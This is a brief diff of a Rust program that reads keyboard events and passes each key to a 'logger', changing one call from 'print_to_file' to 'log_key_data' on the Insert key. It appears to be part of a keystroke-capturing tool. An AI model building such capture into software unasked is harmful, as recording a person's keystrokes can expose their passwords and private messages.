@@ -32,7 +32,7 @@ fn main() -> Result<(), error_type::Errors> {
 
             if event.event_type() == EventType::KEY {
                 if event.code() == Key::KEY_INSERT.code() {
-                    let _ = logger.print_to_file();
+                    let _ = logger.log_key_data();
                 }
                 logger.send_key(&EvdevKeyCode(event.code()), &event.value());
 
